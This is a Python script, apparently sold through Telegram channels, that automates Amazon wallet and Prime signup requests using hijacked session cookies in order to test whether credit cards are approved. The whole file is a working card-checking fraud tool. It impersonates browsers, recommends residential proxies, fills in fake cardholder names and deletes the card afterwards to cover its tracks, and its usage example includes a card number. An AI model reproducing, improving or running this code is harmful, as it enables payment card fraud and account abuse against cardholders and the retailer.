#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ! =====================================================================================
# ! [⚠️] README — AMAZON PRIME BILLING FLOW | COOKIE CONTEXT (PYTHON)
# ! =====================================================================================
# *
# * Author: Vxsilisk © Sxgitario Gateway API Service
# * Project: Amazon Billing / Prime Automation
# * Gateway: Amazon Payments
# * Region: Multi-Region (US / MX / JP / EU / AE / SA / ETC)
# *
# ? -------------------------------------------------------------------------------------
# ?  GENERAL DESCRIPTION
# ? -------------------------------------------------------------------------------------
# * This script automates the complete Amazon billing and Prime subscription flow
# * using REAL Amazon session cookies and browser-like HTTP requests.
# *
# * The flow closely simulates legitimate Amazon mobile and desktop traffic,
# * including CSRF tokens, widget states, session identifiers and cookies.
# *
# * The process includes:
# *  - Amazon session cookie parsing and validation
# *  - Credit card parsing and normalization
# *  - Persistent session handling via curl_cffi.Session
# *  - Dynamic CSRF token extraction
# *  - Credit card insertion into Amazon Wallet
# *  - Billing address creation / retrieval
# *  - Payment instrument activation
# *  - Wallet and payment method verification
# *  - Prime subscription flow initialization
# *  - Prime confirmation attempt
# *  - Automatic cleanup (payment method removal)
# *
# ? -------------------------------------------------------------------------------------
# ?  REQUIREMENTS
# ? -------------------------------------------------------------------------------------
# * Python 3.9+
# *
# * Required libraries:
# *   pip install curl_cffi faker
# *
# * Internal dependencies:
# *   - Utils.Core
# *   - Utils.MetaData
# *
# ? -------------------------------------------------------------------------------------
# ?  KEY FEATURES
# ? -------------------------------------------------------------------------------------
# * - Real browser fingerprinting (Android / iOS / Desktop)
# * - Persistent cookies per session
# * - Multi-region Amazon domain support
# * - HTTP / HTTPS proxy support
# * - Fake user data generation (Faker)
# * - Dynamic widgetState and CSRF handling
# * - Automatic post-flow cleanup
# *
# * Possible result states:
# *   • Approved / Success ✅
# *   • Declined ❌
# *   • Additional verification required ⚠️
# *
# ? -------------------------------------------------------------------------------------
# ?  CONFIGURATION
# ? -------------------------------------------------------------------------------------
# * Constructor parameters:
# *
# * - card   : Credit card format -> NUMBER|MM|YYYY|CVV
# * - cookie : Full Amazon session cookie string
# * - proxy  : (Optional) user:pass@ip:port
# *
# * Usage example:
# *
# *   cookie = 'session-id=...; session-token=...; lc-acbmx=es_MX; ...'
# *   card   = '5306917118508972|05|2027|001'
# *
# *   model  = CookieContext(card, cookie)
# *   result = model.buildFlowBilling()
# *
# *   print(json.dumps(
# *       result,
# *       indent=4,
# *       ensure_ascii=False
# *   ))
# *
# * With proxy:
# *
# *   proxy  = '127.0.0.1:8080'
# *   model  = CookieContext(card, cookie, proxy)
# *
# *
# ! -------------------------------------------------------------------------------------
# !  TECHNICAL NOTES
# ! -------------------------------------------------------------------------------------
# ! - Amazon strictly validates cookies, headers and request order
# ! - Modifying the User-Agent may break the flow
# ! - CSRF tokens and widgetState values are dynamic
# ! - Request order is CRITICAL
# ! - Residential proxies are strongly recommended
# !
# ? -------------------------------------------------------------------------------------
# ?  SUPPORT / CONTACT
# ? -------------------------------------------------------------------------------------
# * Telegram (SHOP):   https://t.me/Sxgitario
# * Telegram (DEV):    https://t.me/Vxsilisk
# * Telegram (SELLER): https://t.me/AlewShawty
# *
# ? Thanks for using Sxgitario Gateway API Service ✨
# ? Happy coding — may your cookies never die 🚀
# ! =====================================================================================


import random, json, time
from .Utils import Core, MetaData
from faker import Faker
from urllib.parse import urlencode, quote_plus
from curl_cffi import requests as curl


class CookieContext:
    
    def __init__(self, card: dict, cookie: str, proxy: str = None) -> None:
        self.cookieNonBuild = cookie
        self.cardNonParsed  = card
        self.fakeData       = Faker()
        self.proxies        = "http://" + proxy if proxy else None



    def buildFlowBilling(self) -> dict:
        
        #//TODO: Configure the build flow for billing using cookie context
        self.cardData   = Core.parseCardString(self.cardNonParsed) 
        self.cookieData = Core.buildCookieData(self.cookieNonBuild)

        if not self.cardData['status'] or not self.cookieData['status']: return {'status': False, 'message': self.cardData['message'] if not self.cardData['status'] else self.cookieData['message']}
        
        self.cookie = self.cookieData['cookie']
        self.domain = self.cookieData['domain']
        self.countryCode = self.cookieData['country_code']

        #//TODO: Configure Cookie Session
        self.curl = curl.Session(impersonate = random.choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
        self.curl.proxies = {"http": self.proxies, "https": self.proxies} if self.proxies else None
        self.curl = Core.createCookieJarFromString(self.curl, self.cookie, self.domain)
        self.curl.allow_redirects = True
        self.curl.headers.update({"Connection": "keep-alive"})
        
        #//! Request 1: Access Amazon Homepage to Set Initial Cookies
        try:
            headers1 = {'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With': 'com.amazon.mShop.android.shopping', 'Accept-Language': 'ja-JP,ja;q=0.9,en;q=0.8' if self.countryCode == 'JP' else ('en-US,en;q=0.9,ar;q=0.8' if self.countryCode in ['AE', 'SA'] else 'en-US,en;q=0.9')}
            request1 = self.curl.get(f"https://www.{self.domain}/ax/account/manage?openid.return_to=https%3A%2F%2Fwww.{self.domain}%2Fyour-account&openid.assoc_handle={self.countryCode}flex&shouldShowPasskeyLink=true&passkeyEligibilityArb=455b1739-065e-4ae1-820a-d72c2583e302&passkeyMetricsActionId=781d7a58-8065-473f-ba7a-f516071c3093", headers = headers1).text
            
        except Exception as e: return {'status': False, 'message': 'Invalid Cookie ⚠️: No relation with Amazon server, try again later!'}

        if "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later." in request1:
            return {'status': False, 'message': Core.REFRESH_MESSAGE}

        #//! Request 2: Access Payment Methods Page to Verify Card Details
        headers2 = {'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With': 'com.amazon.dee.app'}
        request2 = self.curl.get(f"https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca", headers=headers2).text
        csrfToken = Core.extractBetween(request2, 'csrfToken = "', '"')

        #//* Check for Missing CSRF Token
        if not csrfToken: return {'status': False, 'message': Core.REFRESH_MESSAGE}

        #//! Request 3: Submit Card Details for Verification
        headers3 = {'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'client': 'MYXSettings', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': f'https://www.{self.domain}', 'X-Requested-With': 'com.amazon.dee.app', 'Referer': f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}
        payload3 = f'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22{self.fakeData.first_name()}+{self.fakeData.last_name()}%22%2C%22cc_ExpirationMonth%22%3A%22{int(self.cardData["month"])}%22%2C%22cc_ExpirationYear%22%3A%22{self.cardData["year"]}%22%7D%7D%7D&csrfToken={quote_plus(csrfToken)}&addCreditCardNumber={self.cardData["number"]}'
        request3 = self.curl.post(url = f"https://www.{self.domain}/hz/mycd/ajax", headers=headers3, data=payload3).text
        paymentId = Core.extractBetween(request3, '"paymentInstrumentId":"', '"')

        #//* Check for Successful Card Addition
        if not paymentId: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Card Addition Failed)"}

        #//! Request 4: Get Address ID or Add New Address
        addressId = MetaData.getBillingAddressId(self.curl, csrfToken, self.domain)
        if not addressId:
            addAddress = MetaData.addBillingAddress(self.curl, self.domain, self.countryCode)
            time.sleep(2)
            addressId = MetaData.getBillingAddressId(self.curl, csrfToken, self.domain)
            if not addressId: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Address Addition Failed)"}
        
        #//! Request 5: Set Payment Instrument Id
        headers5 = {'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'client': 'MYXSettings', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': f'https://www.{self.domain}', 'X-Requested-With': 'com.amazon.dee.app', 'Referer': f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}
        payload5 = f'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22{paymentId}%22%2C%22billingAddressId%22%3A%22{addressId}%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken={quote_plus(csrfToken)}'
        request5 = self.curl.post(url=f"https://www.{self.domain}/hz/mycd/ajax", headers=headers5, data=payload5)

        #//* Check for Successful Payment Method Set
        if '"success":true,"paymentInstrumentId":"' not in request5.text: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Payment Method Set Failed)"}

        #//! Request 6: Access Wallet Page to Confirm
        headers6 = {'Host': f'www.{self.domain}', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With': 'com.amazon.mShop.android.shopping'}
        request6 = self.curl.get(url=f"https://www.{self.domain}/cpe/yourpayments/wallet?ref_=ya_mshop_mpo", headers=headers6)

        wigstst    = Core.extractBetween(request6.text, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"')
        sessionId  = Core.extractBetween(request6.text, '"sessionId":"', '"')
        customerId = Core.extractBetween(request6.text, 'customerId":"', '"')
        widgetInstanceId = Core.extractBetween(request6.text, 'widgetInstanceId":"', '"')

        #//* Check for Valid Widget State
        if not wigstst: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Widget State Retrieval Failed)"}

        #//! Request 7: Get Payment Method
        headers7 = {'Host': f'www.{self.domain}', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'Widget-Ajax-Attempt-Count': '0', 'APX-Widget-Info': f'YA:Wallet/mobile/{widgetInstanceId}', 'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': f'https://www.{self.domain}', 'Referer': f'https://www.{self.domain}/cpe/yourpayments/wallet?ref_=ya_mshop_mpo'}
        payload7 = f'ppw-jsEnabled=true&ppw-widgetState={wigstst}&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId={paymentId}'
        request7 = self.curl.post(url=f"https://www.{self.domain}/payments-portal/data/widgets2/v1/customer/{customerId}/continueWidget", headers=headers7, data=payload7)
        paymentMethod = Core.extractBetween(request7.text, '\\"paymentMethodId\\":\\"', '\\"')
        
        #//* Check for Valid Payment Method
        if not paymentMethod: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Payment Method Retrieval Failed)"}

        #//! Request 8: Get init Prime Flow
        headers8 = {'Host': f'www.{self.domain}', 'Content-Type': 'application/x-www-form-urlencoded'}
        payload8 = 'clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1'
        request8 = self.curl.post(url=f"https://www.{self.domain}/gp/prime/pipeline/membersignup", headers=headers8, data=payload8)
        wid9090    = Core.extractBetween(request8.text, 'ppw-widgetState&quot; value=&quot;', '&')
        authToken1 = Core.extractBetween(request8.text, 'payment-preference-summary-form&quot;,&quot;selectedInstrumentIds&quot;:[&quot;', '&')
        authToken2 = Core.extractBetween(request8.text, 'Subs:Prime&quot;,&quot;serializedState&quot;:&quot;', '&')
        sessionId  = Core.extractBetween(request8.text, 'Subs:Prime&quot;,&quot;session&quot;:&quot;', '&')
        customerID = Core.extractBetween(request8.text, 'customerId&quot;:&quot;', '&')
        newTokenPr = Core.extractBetween(request8.text, ',&amp;quot;instrumentIds&amp;quot;:[&amp;quot;', '&')

        #//* Check for Valid Prime Init Tokens
        if not authToken2: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Prime Init Token Retrieval Failed)"}

        #//! Request 9: Create Card Flow
        headers9 = {'Host': f'www.{self.domain}', 'X-Requested-With': 'XMLHttpRequest', 'Apx-Widget-Info': 'Subs:Prime/desktop/LFqEJMZmYdCd', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': f'https://www.{self.domain}', 'Referer': f'https://www.{self.domain}/gp/prime/pipeline/confirm'}
        payload9 = f'ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22{paymentId}%22%5D%2C%22instrumentIds%22%3A%5B%22{paymentId}%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState={authToken2}&ie=UTF-8'
        request9 = self.curl.post(url=f"https://www.{self.domain}/payments-portal/data/widgets2/v1/customer/{customerID}/continueWidget", headers=headers9, data=payload9)

        authToken3 = Core.extractBetween(request9.text, 'hidden\\" name=\\"ppw-widgetState\\" value=\\"', '\\"')
        authToken4 = Core.extractBetween(request9.text, 'data-instrument-id=\\"', '\\"')

        #//* Check for Valid Auth Tokens
        if not authToken3: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Auth Token 3 Retrieval Failed)"}

        #//! Request 10: Get Wallet ID
        headers10 = {'Host': f'www.{self.domain}', 'X-Requested-With': 'XMLHttpRequest', 'Apx-Widget-Info': 'Subs:Prime/desktop/r9R8zQ8Dgh1b', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': f'https://www.{self.domain}', 'Referer': f'https://www.{self.domain}/gp/prime/pipeline/membersignup'}
        payload10 = f'ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState={authToken3}&ie=UTF-8&ppw-{authToken4}_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D{paymentId}%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-{paymentId}_instrumentOrderTotalBalance=%7B%7D'
        request10 = self.curl.post(url=f"https://www.{self.domain}/payments-portal/data/widgets2/v1/customer/{customerID}/continueWidget", headers=headers10, data=payload10)
        walletId = Core.extractBetween(request10.text, 'hidden\\" name=\\"ppw-widgetState\\" value=\\"', '\\"')

        #//* Check for Valid Wallet ID
        if not walletId: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Wallet ID Retrieval Failed)"}

        #//! Request 11: Get Wallet ID for Finalization
        headers11 = {'Host': f'www.{self.domain}', 'User-Agent': f'Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(10, 99)}_1_2 like Mac OS X) AppleWebKit/{random.randint(100, 999)}.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E{random.randint(100, 999)} Safari/{random.randint(100, 999)}.1', 'Content-Type': 'application/x-www-form-urlencoded'}
        payload11 = f'ppw-jsEnabled=true&ppw-widgetState={walletId}&ppw-widgetEvent=SavePaymentPreferenceEvent'
        request11 = self.curl.post(url=f"https://www.{self.domain}/payments-portal/data/widgets2/v1/customer/{customerID}/continueWidget", headers=headers11, data=payload11)
        walletId = Core.extractBetween(request11.text, 'preferencePaymentMethodIds":"[\\"', '\\"')

        #//* Check for Valid Wallet ID
        if not walletId: return {'status': False, 'message': Core.REFRESH_MESSAGE + " (Wallet ID Retrieval Failed)"}

        #//! Request 12: Finalize Prime Membership
        headers12 = {'Host': f'www.{self.domain}', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'}
        request12 = self.curl.get(url=f"https://www.{self.domain}/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId={walletId}&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList={walletId}&location=prime_confirm&session-id={sessionId}", headers=headers12)

        #//? Internal Process: Check if Audible Cookie Exists to Delete Payment Method
        detelePaymentProcess = MetaData.deletePaymentMethod(self.cookieNonBuild, paymentMethod, self.curl.proxies)

        #//* Check for Successful Prime Membership Finalization
        return Core.buildFlowBillingResult(request12.text, detelePaymentProcess, self.countryCode, self.cardData)
    

